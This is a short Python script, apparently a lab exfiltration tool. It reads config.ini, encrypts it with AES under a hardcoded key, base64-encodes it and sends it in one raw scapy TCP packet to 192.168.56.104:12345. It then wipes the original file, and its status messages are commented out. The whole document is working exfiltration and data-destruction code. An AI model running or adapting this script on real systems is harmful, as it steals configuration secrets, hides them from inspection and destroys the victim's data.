from scapy.all import Raw, send
from scapy.layers.inet import IP, TCP
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import random

SECRET_KEY = b"16bytesecret1234"
BLOCK_SIZE = 16

file = "config.ini"

# Load file data
with open(file, "r") as f:
    file_data = f.read()

# print(f"[+] Loaded {len(file_data)} bytes from {file}")

# Encrypt data
cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
iv = cipher.iv
encrypted_data = cipher.encrypt(pad(file_data.encode(), BLOCK_SIZE))

# Base64 encode
payload = base64.b64encode(iv + encrypted_data)

dst_ip = "192.168.56.104"
dst_port = 12345

# Random source port
src_port = random.randint(1024, 65535)

packet = (
    IP(dst=dst_ip) /
    TCP(sport=src_port, dport=dst_port, flags="PA") /
    Raw(load=payload)
)

# print(f"[+] Sending {len(payload)} bytes over TCP to {dst_ip}:{dst_port}")
send(packet, verbose=0)
# print("[+] Packet sent successfully.")

# Securely clear the file
with open(file, "w") as f:
    f.write("")

# print(f"[+] Cleared contents of {file}")
